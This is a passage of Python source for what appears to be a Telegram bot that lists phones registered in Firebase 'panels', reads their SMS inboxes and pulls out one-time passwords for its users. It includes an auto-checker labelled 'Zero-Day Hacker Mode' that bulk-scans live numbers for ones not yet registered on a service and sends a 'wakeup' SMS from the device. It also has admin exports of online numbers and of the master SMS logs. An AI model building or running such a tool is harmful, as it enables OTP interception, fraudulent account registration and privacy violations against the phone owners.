            text = f"DEVICE DASHBOARD\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nClick View Inbox to fetch OTPs manually."
            
            wl = users_db.get(chat_id, {}).get("wishlist", [])
            wish_text = "❌ Remove from Wishlist" if dev_id in wl else "⭐ Add to Wishlist"
            wish_cb = f"wish_rem:{dev_id}" if dev_id in wl else f"wish_add:{dev_id}"
            
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{dev_id}")],
                [InlineKeyboardButton(wish_text, callback_data=wish_cb)],
                [InlineKeyboardButton("🔙 Back to List",  callback_data="home")]
            ])
            await safe_edit(query, text, reply_markup=kb)
            return

        if data.startswith("msgs:"):
            parts = data.split(":")
            dev_id = parts[1]
            service_used = parts[2] if len(parts) > 2 else ""

            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            device = next((d for d in devices if d.id == dev_id), None)
            
            if not device:
                await query.answer("Device not found in active list!", show_alert=True)
                return
                
            label = device_label(device)
            smss = await get_device_sms(device, limit=10, max_age_sec=3600)
            
            back_btn = InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")
            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
            
            if not smss:
                await safe_edit(query, f"📭 **Inbox Empty (Last 1 Hour)**\n📱 Number: `{label}`\n\nRefresh dabate rahein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
                return
                
            header = f"📩 **FAST INBOX (Last 1 Hour)**\n━━━━━━━━━━━━━━━━━━\n📱 **Number:** `{label}`\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons = [], []
            
            for sms in smss:
                block, otp = format_sms_block_markdown(sms)
                body_parts.append(block)
                if otp: otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
            
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="Markdown")
            return

        # AUTO-CHECKER MENUS
        if data == "open_checker_menu":
            await safe_edit(query, "<b>Select Checker (Manual Bulk)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
            return

        if data == "open_auto_checker_menu":
            await safe_edit(query, "🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
            return

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:\n\n_Press Cancel to stop_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="Markdown")
            return

        if data.startswith("auto_fb:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "auto_check", "status": "running"}
            seen_set = user_seen_unreg.setdefault(chat_id, set())

            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices active in last 30 MINUTES...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Scan", callback_data="cancel_scan")]]), parse_mode="HTML")
            
            all_devices = await get_all_devices(chat_id)
            if not all_devices:
                return await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            fresh_devices = []
            for d in all_devices:
                if d.status == "online" and d.numbers:
                    is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800)
                    if is_valid:
                        d.last_sms_ts = last_ts
                        fresh_devices.append(d)
            
            if not fresh_devices: 
                return await safe_edit(query, "❌ Koi bhi number pichle 30 minute me online/active nahi mila. OTP aane ki chance low hai.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
            random.shuffle(fresh_devices)
            if len(seen_set) > 5000: seen_set.clear() 
            fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
            
            if not fresh_devices:
                return await safe_edit(query, "✅ Saare active numbers already check ho chuke hain. Kuch minutes baad try karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            check_pool = fresh_devices[:100] 
            
            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Scanning {len(check_pool)} Active Numbers...\n⚡ <i>Hitting APIs concurrently...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Scan", callback_data="cancel_scan")]]), parse_mode="HTML")
            
            found_unreg, final_res, final_dev, final_num = False, None, None, ""
            
            for i in range(0, len(check_pool), 15):
                state = pending_action.get(chat_id, {})
                if state.get("action") == "auto_check" and state.get("status") == "stopped":
                    return await safe_edit(query, "❌ **Auto-Check Cancelled by User!**", parse_mode="Markdown")

                batch = check_pool[i:i+15]
                tasks = [check_number_api(service, d.numbers[0]) for d in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for d, res in zip(batch, results):
                    if isinstance(res, dict) and not res.get("status") == "error":
                        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                        if not is_reg:
                            found_unreg, final_res, final_dev, final_num = True, res, d, d.numbers[0]
                            break
                if found_unreg: break
                await asyncio.sleep(0.5)
                        
            if found_unreg:
                seen_set.add(final_num)
                await safe_edit(query, f"🔥 **ZERO-DAY HACKER MODE**\n━━━━━━━━━━━━━━━━━━\n🎯 **Unregistered Found:** `+{final_num[-10:]}`\n\n💉 *Injecting Wakeup SMS...*", parse_mode="Markdown")
                await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                
                time_diff = int(time.time() - final_dev.last_sms_ts)
                mins_ago = time_diff // 60
                secs_ago = time_diff % 60
                last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
                
                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                res_text += f"\n\n📡 <b>Device Activity:</b>\n⏱️ Last SMS: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
                
                kb = [
                    [InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
                    [InlineKeyboardButton("🔍 Search Number", callback_data=f"search_num:{final_num[-10:]}")],
                    [InlineKeyboardButton("🔄 Find Another Fresh Number", callback_data=data)],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
                ]
                await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            else:
                await safe_edit(query, f"<b>✅ ALL REGISTERED</b>\n\nScanned {len(check_pool)} fresh active numbers. ALL are registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
            return

        # CUSTOM PANELS & ADMIN
        if data.startswith("del_panel:"):
            idx_to_del = int(data.split(":")[1])
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if 0 <= idx_to_del < len(dbs):
                dbs.pop(idx_to_del)
                save_user(chat_id)
                await query.answer("Panel Deleted!", show_alert=True)
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if not dbs:
                await safe_edit(query, "You have no custom panels left.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                return
            kb = [[InlineKeyboardButton(f"❌ Delete: {(db if isinstance(db, str) else db.get('url', ''))[:25]}...", callback_data=f"del_panel:{i}")] for i, db in enumerate(dbs)]
            kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
            await safe_edit(query, "🗑 **Delete Custom Panels**:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
            return

        if data == "sa_add_global_panel" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL (ya multiple URLs enter se separate karke) bhejein.\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_view_user_panels" and chat_id in ADMIN_IDS:
            msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"User: {uid}\n"
                    for db in dbs: msg_text += f"{db}\n"
                    msg_text += "\n"
            if msg_text == "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n": msg_text += "Koi custom panel nahi mila."
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
            return
            
        if data == "sa_export_numbers" and chat_id in ADMIN_IDS:
            devices = await get_all_devices(chat_id)
            online_nums = []
            for d in devices:
                if d.status == "online": online_nums.extend(d.numbers)
            if not online_nums:
                await query.answer("Filhal koi bhi number online nahi hai.", show_alert=True)
                return
            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
            unique_online = set(online_nums)
            with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(unique_online))
            await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename="Active_Online_Numbers.txt", caption=f"Total Active Unique Numbers: {len(unique_online)}")
            return

        if data == "sa_download_logs" and chat_id in ADMIN_IDS:
            if not os.path.exists(SMS_LOG_FILE):
                await query.answer("Log file abhi tak bani nahi hai.", show_alert=True)
                return
            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_SMS_Log.txt", caption="Master SMS Database Log")
            return

        if data == "admin_refresh" and chat_id in ADMIN_IDS:
            total    = len(users_db)
            total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
            text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
                [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
                [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
                [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
                [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
            ])
            await safe_edit(query, text, reply_markup=kb)
            return

    except Exception: pass

# ═══════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER
# ═══════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text    = (update.message.text or "").strip()
    
    if not await check_force_join(ctx.bot, chat_id):
        join_kb = InlineKeyboardMarkup([[InlineKeyboardButton("✅ I have joined", callback_data="check_join")]])
        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle channels join karne honge.", reply_markup=join_kb, parse_mode="Markdown")
        return

    users_db = all_users
    uinfo = users_db.get(chat_id, {})
    is_vip = uinfo.get("vip_until", 0) > time.time()
    is_admin = chat_id in ADMIN_IDS

    if is_spamming(chat_id): return

    if text == "🌐 Global Devices List":
        pending_action.pop(chat_id, None)
        if not is_vip and not is_admin:
            target = uinfo.get("vip_target", 20)
            await update.message.reply_text(f"❌ **VIP ONLY FEATURE**\n\nGlobal Panels sirf VIPs ke liye hain.\nVIP banne ke liye apne Referral Link se {target} dosto ko invite karein!", parse_mode="Markdown")
            return
            
        devices = await get_all_devices(chat_id)
        if not devices:
            await update.message.reply_text("⏳ **Live Booting...**\nThodi der baad try karein, panels fetch ho rahe hain.")
            return
        await update.message.reply_text(device_list_header(devices, 0, "🌐 GLOBAL DEVICES"), reply_markup=device_list_keyboard(devices, 0))
        return

    if text == "🔍 Search Number":
        if not is_vip and not is_admin:
            target = uinfo.get("vip_target", 20)
            await update.message.reply_text(f"❌ **VIP ONLY FEATURE**\n\nNumber Search sirf VIPs ke liye hai.\nVIP banne ke liye apne Referral Link se {target} dosto ko invite karein!", parse_mode="Markdown")
            return
            
        pending_action[chat_id] = {"action": "search_number_input"}
        await update.message.reply_text("🔍 **SEARCH NUMBER**\n\nKripya 10-digit number enter karein jisko aap dhundhna chahte hain:\n\n_Type 'Cancel' to stop._", parse_mode="Markdown")
        return

    if text == "⭐ My Wishlist":
        pending_action.pop(chat_id, None)
        wishlist_ids = uinfo.get("wishlist", [])
        if not wishlist_ids:
            await update.message.reply_text("📭 Aapki Wishlist khaali hai!\nKisi bhi number ke 'Device Info' me jakar use ⭐ Add to Wishlist karein.")
            return
            
        all_cached = GLOBAL_DEVICE_CACHE.get("ALL", [])
        wish_devices = [d for d in all_cached if d.id in wishlist_ids]
        
        if not wish_devices:
            await update.message.reply_text("📭 Aapke wishlist kiye hue numbers abhi Offline hain ya Database se hat gaye hain.")
            return
            
        await update.message.reply_text(device_list_header(wish_devices, 0, "⭐ MY WISHLIST"), reply_markup=device_list_keyboard(wish_devices, 0))
        return

    if text == "⚡ Auto-Check Panels":
        pending_action.pop(chat_id, None)
        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
        return

    if text == "Manual Checker":
        pending_action.pop(chat_id, None)
        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
        return

    if text == "🎁 Refer & Earn VIP":
        ref_count = uinfo.get("referrals", 0)
        target = uinfo.get("vip_target", 20)
        bot_user = await ctx.bot.get_me()
        ref_link = f"https://t.me/{bot_user.username}?start=ref_{chat_id}"
        
        msg = (
            "🎁 **REFER & EARN VIP ACCESS**\n━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Your Referrals:** {ref_count} / {target}\n"
            f"💰 **Total Coins:** {uinfo.get('coins', 0)}\n\n"
            f"Apne {target} dosto ko invite karein aur **24 Ghante ke liye Unlimited Global Panels & Search** ka access paayein!\n\n"
            f"🔗 **Share Your Link:**\n`{ref_link}`"
        )
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    if text == "Add Custom Panel":
        pending_action[chat_id] = {"action": "set_personal_db"}
        await update.message.reply_text("➕ **ADD CUSTOM PANELS**\n━━━━━━━━━━━━━━━━━━\nApni Firebase URLs bhejein.\n\nType 'Cancel' to stop.", parse_mode="Markdown")
        return

    if text == "Delete Custom Panel":
        dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
        if not dbs:
            await update.message.reply_text("You haven't added any custom panels to delete.")
            return
        kb = [[InlineKeyboardButton(f"❌ Delete: {(db if isinstance(db, str) else db.get('url', ''))[:25]}...", callback_data=f"del_panel:{i}")] for i, db in enumerate(dbs)]
        kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
        await update.message.reply_text("🗑 **Delete Custom Panels**:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        return

    if text == "Admin Panel" and chat_id in ADMIN_IDS:
        total    = len(users_db)
        total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
        msg_text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
            [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
            [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
            [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
            [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
        ])
        await update.message.reply_text(msg_text, reply_markup=kb)
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("✅ Action cancelled.", reply_markup=get_reply_menu(chat_id))
        else: await update.message.reply_text("No pending action.")
        return

    state = pending_action.get(chat_id)
    if not state: return
    action = state.get("action")
    
    if action == "search_number_input":
        search_term = re.sub(r"\D", "", text)
        if len(search_term) < 4:
            await update.message.reply_text("❌ Please enter at least 4 digits of the number to search.")
            return
            
        pending_action.pop(chat_id)
        wait_msg = await update.message.reply_text(f"⏳ Searching databases for `{search_term}`...", parse_mode="Markdown")
        
        all_devices = await get_all_devices(chat_id)
        found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers)]
        
        if not found_devs:
            await wait_msg.edit_text(f"📭 No devices found containing `{search_term}`.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return
            
        rows = [[InlineKeyboardButton(f"{'🟢' if d.status=='online' else '🔴'} [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:15]]
        rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        await wait_msg.edit_text(f"🔍 **Search Results for `{search_term}`:**\nSelect a number to connect:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="Markdown")
        return

    if action == "check_number_input":
        raw_nums = re.sub(r"\D", " ", text).split()
        target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
        if not target_nums:
            await update.message.reply_text("❌ Invalid input! Koi valid 10-digit Indian number nahi mila.")
            return
        
        service = state["service"]
        pending_action.pop(chat_id)
        
        if len(target_nums) == 1:
            number = target_nums[0]
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
            res = await check_number_api(service, number)
            
            is_error = res.get("status") == "error"
            ms = res.get("ms", 0)
            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
            
            res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
            
            kb = []
            if not is_reg and not is_error:
                kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
            kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
            await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else:
            total_bulk = len(target_nums)
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
            
            bulk_results = []
            BATCH_SIZE = 100 
            
            for i in range(0, total_bulk, BATCH_SIZE):
                batch = target_nums[i:i+BATCH_SIZE]
                tasks = [check_number_api(service, num) for num in batch]
                res_list = await asyncio.gather(*tasks, return_exceptions=True)
                
                for num, res in zip(batch, res_list):
                    if isinstance(res, Exception) or res.get("status") == "error":
                        bulk_results.append(f"❌ <code>{num}</code> - Error")
                        continue
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    stat = "Reg" if is_reg else "UNREG"
                    bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {stat}")
                await asyncio.sleep(0.5)
            
            res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
            if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
                
            kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
            await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return

    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
        pending_action.pop(chat_id)
        urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
        firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
        if not firebase_urls:
            await update.message.reply_text("Koi valid Firebase URL nahi mili.")
            return
            
        SETTINGS.setdefault("global_panels", []).extend(firebase_urls)
        save_settings()
        await update.message.reply_text(f"✅ SUCCESS! {len(firebase_urls)} panels Global Default list me add ho gaye hain.")
        return

    if action == "set_personal_db":
        urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
        firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
        
        if not firebase_urls:
            await update.message.reply_text("❌ Invalid Input! Kripya sirf Firebase URLs bhejein.")
            return
            
        pending_action.pop(chat_id)
        expiry_time = time.time() + (86400 * 365) 
        for custom_url in firebase_urls:
            users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append({"url": custom_url, "expiry": expiry_time})
            
        save_user(chat_id)
        await update.message.reply_text(f"✅ {len(firebase_urls)} Personal Firebase URLs successfully add ho gaye!\n\nAb aap 'Devices List' me jakar sirf apne numbers dekh sakte hain.", reply_markup=get_reply_menu(chat_id))
        return

# ═══════════════════════════════════════════════════════
#  MAIN RUNNER
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("TOKEN is missing!")
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start",   cmd_start, block=False))
    app.add_handler(CommandHandler("admin",   cmd_admin, block=False))
    app.add_handler(CallbackQueryHandler(on_callback, block=False))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text, block=False))

    async def post_init(application: Application) -> None:
        load_data()
        async def web_server():
            try:
                app_web = web.Application()
                app_web.router.add_get('/', lambda r: web.Response(text="Bot is running smoothly!"))
                runner = web.AppRunner(app_web)
                await runner.setup()
                port = int(os.environ.get("PORT", 8080))
                site = web.TCPSite(runner, '0.0.0.0', port)
                await site.start()
            except Exception: pass
        asyncio.create_task(web_server())
        asyncio.create_task(global_cache_loop())  
        asyncio.create_task(auto_save_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
